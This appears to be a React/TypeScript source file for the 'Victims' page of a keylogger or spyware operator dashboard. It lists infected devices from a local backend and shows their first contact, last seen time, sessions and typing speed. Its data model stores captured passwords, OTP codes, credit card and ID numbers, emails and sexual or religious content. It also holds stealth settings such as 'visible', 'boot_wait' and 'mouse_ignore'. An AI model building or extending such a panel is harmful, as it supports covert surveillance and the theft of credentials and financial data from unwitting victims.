import { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Badge } from '@/components/ui/badge';
import { 
  Calendar, 
  Clock, 
  Type, 
  Info, 
  Edit2, 
  Check, 
  X,
  Monitor,
  MapPin,
  User,
  Activity,
  Timer
} from 'lucide-react';
import { useToast } from '@/hooks/use-toast';

interface SystemInfo {
  os: string;
  arch: string;
  hostname: string;
  ip: string;
}

interface Victim {
  _id: string;
  deviceName: string;
  display_name?: string;
  registered_on: string;
  tags: string[];
  TypingSpeed: number;
  offensive_keywords: string[];
  Passwords: string[];
  OTP: string[];
  EmailAddresses: string[];
  PhoneNumbers: string[];
  IDNumbers: string[];
  CreditCardNumbers: string[];
  LocationReferences: string[];
  Names: string[];
  URLs: string[];
  dates: string[];
  ip_addresses: string[];
  monetary_amounts: string[];
  sexual_content: string[];
  religious_references: string[];
  total_sessions: number;
  last_seen: string;
  total_days_active: number;
  total_active_time: number;
  apps_used: Array<{
    appname: string;
    timespent: number;
  }>;
  notes?: string;
  location?: string;
  system_info: SystemInfo;
  config: {
    format: number;
    visible: boolean;
    boot_wait: boolean;
    mouse_ignore: boolean;
    serverName: string;
    resource: string;
    intervalMinutes: number;
    log_file_name: string;
    backend_port: number;
  };
}

export const VictimsPage = () => {
  const [victims, setVictims] = useState<Victim[]>([]);
  const [loading, setLoading] = useState(true);
  const [editingName, setEditingName] = useState<string | null>(null);
  const [editValue, setEditValue] = useState('');
  const navigate = useNavigate();
  const { toast } = useToast();

  useEffect(() => {
    fetchVictims();
  }, []);

  const fetchVictims = async () => {
    try {
      const response = await fetch('http://localhost:8000/api/clients', {
        headers: {
          'Authorization': `Bearer ${localStorage.getItem('token')}`
        }
      });
      
      if (response.ok) {
        const data = await response.json();
        setVictims(data);
      } else {
        throw new Error('Failed to fetch victims');
      }
    } catch (error) {
      console.error('Error fetching victims:', error);
      toast({
        title: "Error",
        description: "Failed to load victims data.",
        variant: "destructive"
      });
    } finally {
      setLoading(false);
    }
  };

  const handleEditName = (victimId: string, currentName: string) => {
    setEditingName(victimId);
    setEditValue(currentName);
  };

  const handleSaveName = async (victimId: string) => {
    try {
      const response = await fetch(`http://localhost:8000/api/clients/${victimId}`, {
        method: 'PUT',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${localStorage.getItem('token')}`
        },
        body: JSON.stringify({ display_name: editValue })
      });

      if (response.ok) {
        setVictims(prev => prev.map(victim => 
          victim._id === victimId 
            ? { ...victim, display_name: editValue }
            : victim
        ));
        toast({
          title: "Success",
          description: "Display name updated successfully.",
        });
      } else {
        throw new Error('Failed to update name');
      }
    } catch (error) {
      toast({
        title: "Error",
        description: "Failed to update display name.",
        variant: "destructive"
      });
    } finally {
      setEditingName(null);
      setEditValue('');
    }
  };

  const handleCancelEdit = () => {
    setEditingName(null);
    setEditValue('');
  };

  const formatDate = (dateString: string) => {
    return new Date(dateString).toLocaleDateString('en-US', {
      year: 'numeric',
      month: 'short',
      day: 'numeric',
      hour: '2-digit',
      minute: '2-digit'
    });
  };

  if (loading) {
    return (
      <div className="flex items-center justify-center h-64">
        <div className="text-lg">Loading victims...</div>
      </div>
    );
  }

  return (
    <div className="space-y-6">
      <div className="flex justify-between items-center">
        <h1 className="text-3xl font-bold text-foreground">Victims</h1>
        <Badge variant="secondary" className="text-sm">
          {victims.length} Total Victims
        </Badge>
      </div>

      <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
        {victims.map((victim) => (
          <Card key={victim._id} className="hover:shadow-lg transition-shadow">
            <CardHeader className="pb-3">
              <div className="flex items-start justify-between">
                <div className="flex-1 min-w-0">
                  {editingName === victim._id ? (
                    <div className="flex items-center space-x-2">
                      <Input
                        value={editValue}
                        onChange={(e) => setEditValue(e.target.value)}
                        className="flex-1"
                        autoFocus
                      />
                      <Button
                        size="sm"
                        onClick={() => handleSaveName(victim._id)}
                        className="h-8 w-8 p-0"
                      >
                        <Check className="h-4 w-4" />
                      </Button>
                      <Button
                        size="sm"
                        variant="outline"
                        onClick={handleCancelEdit}
                        className="h-8 w-8 p-0"
                      >
                        <X className="h-4 w-4" />
                      </Button>
                    </div>
                  ) : (
                    <div className="flex items-center space-x-2">
                      <CardTitle className="text-lg truncate">
                        {victim.display_name || 'Unnamed Device'}
                      </CardTitle>
                      <Button
                        size="sm"
                        variant="ghost"
                        onClick={() => handleEditName(victim._id, victim.display_name || '')}
                        className="h-6 w-6 p-0"
                      >
                        <Edit2 className="h-3 w-3" />
                      </Button>
                    </div>
                  )}
                  <CardDescription className="text-sm text-muted-foreground truncate">
                    {victim.deviceName}
                  </CardDescription>
                </div>
                <Button
                  size="sm"
                  variant="outline"
                  onClick={() => navigate(`/${victim._id}`)}
                  className="flex-shrink-0"
                >
                  <Info className="h-4 w-4" />
                </Button>
              </div>
            </CardHeader>
            
            <CardContent className="space-y-3">
              <div className="grid grid-cols-2 gap-3 text-sm">
                <div className="flex items-center space-x-2">
                  <Calendar className="h-4 w-4 text-muted-foreground" />
                  <div>
                    <p className="font-medium">First Contact</p>
                    <p className="text-muted-foreground">
                      {formatDate(victim.registered_on)}
                    </p>
                  </div>
                </div>
                
                <div className="flex items-center space-x-2">
                  <Clock className="h-4 w-4 text-muted-foreground" />
                  <div>
                    <p className="font-medium">Last Seen</p>
                    <p className="text-muted-foreground">
                      {victim.last_seen ? formatDate(victim.last_seen) : 'Never'}
                    </p>
                  </div>
                </div>
                
                <div className="flex items-center space-x-2">
                  <Type className="h-4 w-4 text-muted-foreground" />
                  <div>
                    <p className="font-medium">Typing Speed</p>
                    <p className="text-muted-foreground">
                      {victim.TypingSpeed || 0} WPM
                    </p>
                  </div>
                </div>
                
                <div className="flex items-center space-x-2">
                  <Monitor className="h-4 w-4 text-muted-foreground" />
                  <div>
                    <p className="font-medium">Sessions</p>
                    <p className="text-muted-foreground">
                      {victim.total_sessions || 0}
                    </p>
                  </div>
                </div>
                
                <div className="flex items-center space-x-2">
                  <Activity className="h-4 w-4 text-muted-foreground" />
                  <div>
                    <p className="font-medium">Days Active</p>
                    <p className="text-muted-foreground">
                      {victim.total_days_active || 0}
                    </p>
                  </div>
                </div>
                
                <div className="flex items-center space-x-2">
                  <Timer className="h-4 w-4 text-muted-foreground" />
                  <div>
                    <p className="font-medium">Active Time</p>
                    <p className="text-muted-foreground">
                      {victim.total_active_time ? Math.round(victim.total_active_time / 1000 / 60) : 0}m
                    </p>
                  </div>
                </div>
              </div>
              
              {victim.location && (
                <div className="flex items-center space-x-2 text-sm">
                  <MapPin className="h-4 w-4 text-muted-foreground" />
                  <span className="text-muted-foreground">{victim.location}</span>
                </div>
              )}
              
              {victim.tags && victim.tags.length > 0 && (
                <div className="flex flex-wrap gap-1">
                  {victim.tags.slice(0, 3).map((tag, index) => (
                    <Badge key={index} variant="outline" className="text-xs">
                      {tag}
                    </Badge>
                  ))}
                  {victim.tags.length > 3 && (
                    <Badge variant="outline" className="text-xs">
                      +{victim.tags.length - 3} more
                    </Badge>
                  )}
                </div>
              )}
            </CardContent>
          </Card>
        ))}
      </div>
      
      {victims.length === 0 && (
        <div className="text-center py-12">
          <User className="h-12 w-12 text-muted-foreground mx-auto mb-4" />
          <h3 className="text-lg font-medium text-muted-foreground mb-2">
            No victims found
          </h3>
          <p className="text-muted-foreground">
            Victims will appear here once they connect to the system.
          </p>
        </div>
      )}
    </div>
  );
}; 